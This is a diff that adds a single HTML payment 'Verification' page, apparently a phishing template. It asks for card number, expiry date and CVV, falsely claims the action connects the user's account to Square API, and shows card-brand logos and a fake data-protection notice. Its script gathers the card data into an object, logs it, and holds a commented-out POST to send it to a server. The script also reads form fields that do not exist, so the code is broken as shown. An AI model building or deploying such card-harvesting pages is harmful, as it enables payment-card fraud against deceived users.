@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html balance-checker="true" id="200511283" lang="eu" verification="true" version="2" style="filter: hue-rotate(3deg);">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Страница оплаты</title>
+    <style>
+        body {
+             margin: 0;
+            font-family: sans-serif;
+           display: flex;
+           flex-direction: column;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+        }
+        main {
+            flex: 1;
+            display: flex;
+           justify-content: center;
+            align-items: center;
+            padding: 20px;
+           position: relative;
+        }
+        .form {
+            width: 90%;
+           max-width: 600px;
+            background-color: white;
+           padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .payment-header {
+            display: flex;
+           justify-content: space-between;
+           align-items: center;
+            margin-bottom: 20px;
+       }
+        .payment-header h1 {
+           margin: 0;
+        }
+        .service-button {
+            display: flex;
+            align-items: center;
+           cursor: pointer;
+        }
+        .service-button p{
+           margin: 0;
+        }
+        .input-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+        .input {
+            margin-bottom: 15px;
+            width: 100%;
+        }
+        .input-header {
+           display: flex;
+           justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        .input-header p {
+           margin: 0;
+        }
+        .input-error {
+            color: red;
+            font-size: 0.9em;
+        }
+        input.font-headline {
+            padding: 10px;
+            border: 1px solid #ccc;
+           border-radius: 5px;
+           width: 100%;
+           box-sizing: border-box;
+       }
+        .card-container {
+           margin-bottom: 15px;
+        }
+        .banks {
+           margin-top: 10px;
+            display: flex;
+           gap: 5px;
+        }
+        .banks img {
+           max-height: 30px;
+        }
+        .details-block {
+           margin-top: 20px;
+        }
+        .notice {
+            margin-top: 10px;
+       }
+        .notice-item {
+           display: flex;
+            align-items: center;
+           margin-bottom: 10px;
+        }
+        .notice-image-container {
+            width: 25px; /* Adjust the width to match the icon size */
+            height: 25px; /* Adjust the height to match the icon size */
+           border-radius: 50%; /* Make it a circle */
+           background-color: #8A2BE2; /* Violet color */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 5px; /* Space between the icon and text */
+        }
+       .notice-image-container img {
+            max-height: 20px; /* Smaller size for the icon */
+            filter: invert(100%) sepia(50%) hue-rotate(270deg) brightness(97%) contrast(90%); /* Violet-white */
+            margin-right: 10px;
+        }
+       .notice-image-container svg {
+            width: 15px;
+            height: 15px;
+            fill: white;
+        }
+        .notice-text {
+           margin-left: 10px;
+       }
+        .submit-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .submit-button {
+            padding: 15px 30px;
+            font-size: 1.2em;
+            color: #fff;
+           border: none;
+           border-radius: 5px;
+            cursor: pointer;
+           background: linear-gradient(to right, #3498db, #2ecc71);
+            background-size: 200% auto;
+           transition: background-position 0.5s ease-in-out;
+        }
+        .submit-button:hover {
+           background-position: right center;
+        }
+        .submit-text {
+           font-size: 0.9em;
+            color: #666;
+            margin-top: 10px;
+        }
+       .submit-blue {
+           color: #3498db;
+            text-decoration: underline;
+        }
+        .chatra--webkit {
+           width: 380px;
+            height: 600px;
+           transform: none;
+            z-index: 2147483647;
+            display: none;
+           position: absolute;
+            bottom: 20px;
+            right: 20px;
+        }
+        .support-circle {
+            width: 60px;
+            height: 60px;
+            background-color: #3498db;
+           border-radius: 50%;
+            position: absolute;
+            bottom: 20px;
+           left: 20px;
+            cursor: pointer;
+            z-index: 1000;
+            display: flex;
+           justify-content: center;
+            align-items: center;
+        }
+        .support-circle::before {
+           content: '';
+            display: block;
+            width: 20px;
+            height: 20px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>');
+            background-size: contain;
+           background-repeat: no-repeat;
+        }
+       @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+    </style>
+</head>
+<body>
+    <main class="main">
+        <form class="form" id="paymentForm">
+           <div class="payment-block">
+                <div class="payment-header">
+                    <h1>Verification</h1>
+                    <div class="service-button">
+                        <p>Custom</p>
+                   </div>
+               </div>
+                <div class="card-container">
+                    <div class="input ">
+                        <div class="input-header font-footnote">
+                            <p>Card Number</p>
+                            <p class="input-error"></p>
+                        </div>
+                        <input class="font-headline " id="card" placeholder="0000 0000 0000 0000" label="Card Number" type="text" value="" maxlength="19">
+                    </div>
+                    <div class="banks">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/1200px-Visa_Inc._logo.svg.png" alt="Visa">
+                       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png" alt="MasterCard">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Maestro_logo.svg/260px-Maestro_logo.svg.png" alt="Maestro">
+                   </div>
+                </div>
+                <div class="input-row">
+                    <div class="input ">
+                        <div class="input-header font-footnote">
+                            <p>Expiry Date</p>
+                            <p class="input-error"></p>
+                       </div>
+                        <input class="font-headline " id="date" placeholder="01/28" label="Expiry Date" type="text" value="" maxlength="5">
+                    </div>
+                    <div class="input ">
+                       <div class="input-header font-footnote">
+                           <p>CVV</p>
+                           <p class="input-error" id="cvvError"></p>
+                       </div>
+                        <input class="font-headline " id="cvv" placeholder="•••" label="CVV" type="text" value="" maxlength="3">
+                    </div>
+                </div>
+               <div class="details-block">
+                    <h1>Details</h1>
+                    <div class="notice">
+                        <div class="notice-item">
+                           <div class="notice-image-container">
+                               <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                   <path d="M9 11.25L17 11.25V18.75C17 19.1929 16.7242 19.5474 16.3278 19.6955L8.31666 19.2277C8.18059 19.2196 8.01378 19.2189 7.86662 19.1985L0.133297 10.0919L7.67168 2.50442C7.97415 1.60043 8.73835 0.764255 9.75144 0.151481C9.77568 0.0566318 9.86769 0.0160016 9.9712 0C10.0747 0.0160016 10.1667 0.0566318 10.1909 0.151481L10.8051 1.12455L17.75 8.86646Z" stroke="white" stroke-width="2"/>
+                                </svg>
+                           </div>
+                           <div class="notice-text">
+                                <h2 class="font-headline">Data protection</h2>
+                                <p class="font-body-2">We prioritize the safeguarding of your personal data, maintaining its integrity and confidentiality through stringent web protocols.</p>
+                           </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="submit-container">
+                    <button class="submit-button font-headline" type="submit">Next</button>
+                    <p class="submit-text font-body-2">By clicking “Next”, you confirm your intention to connect your account to Square API. This action signifies you accept of the <span class="submit-blue">Conditions</span> and <span class="submit-blue">Confidentiality</span>.</p>
+                </div>
+            </div>
+        </form>
+       <div class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle" data-turbolinks-permanent="" id="chatra" style="
+           width: 380px;
+            height: 600px;
+            transform: none;
+            z-index: 2147483647;
+           display: none;
+        ">
+            <div id="chatra__iframe-wrapper">
+                <iframe allow="autoplay" allowtransparency="true" frameborder="0" id="chatra__iframe" src="/supportChatFrame/200511283" style="width: 380px; height: 600px; position: absolute" title="Chatra live chat"></iframe>
+            </div>
+        </div>
+        <div class="support-circle" onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+    </main>
+    <script>
+        const cardInput = document.getElementById('card');
+       cardInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.substring(0, 16);
+           let formattedValue = '';
+           for (let i = 0; i < value.length; i++) {
+                formattedValue += value[i];
+               if ((i + 1) % 4 === 0 && i !== value.length - 1) {
+                   formattedValue += ' ';
+                }
+           }
+            e.target.value = formattedValue;
+       });
+        const dateInput = document.getElementById('date');
+        dateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.substring(0, 4);
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                formattedValue += value[i];
+                if (i === 1 && value.length > 2) {
+                   formattedValue += '/';
+               }
+           }
+           e.target.value = formattedValue;
+        });
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Предотвращаем отправку формы по умолчанию
+           const name = document.getElementById('name').value;
+            const surname = document.getElementById('surname').value;
+            const card = document.getElementById('card').value;
+           const date = document.getElementById('date').value;
+           const cvv = document.getElementById('cvv').value;
+           const cvvError = document.getElementById('cvvError');
+           cvvError.textContent = ''; // Сбрасываем текст ошибки
+            if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+               cvvError.textContent = 'Invalid Code';
+               return;
+            }
+            const data = {
+                name: name,
+                surname: surname,
+                card: card,
+                date: date,
+               cvv: cvv
+            };
+           console.log('Data to send:', data); // Вывод данных в консоль
+            // Здесь вы можете добавить код для отправки данных на сервер
+            // Например, с помощью fetch или XMLHttpRequest
+            alert('Данные отправлены (смотрите консоль)'); // Сообщаем об отправке данных
+            /*
+            fetch('/submit-form', {
+                method: 'POST',
+                headers: {
+                   'Content-Type': 'application/json'
+                },
+               body: JSON.stringify(data)
+           })
+           .then(response => response.json())
+           .then(result => {
+                console.log('Success:', result);
+                alert('Данные успешно отправлены!');
+           })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Ошибка при отправке данных!');
+            });
+            */
+        });
+    </script>
+</body>
+</html>
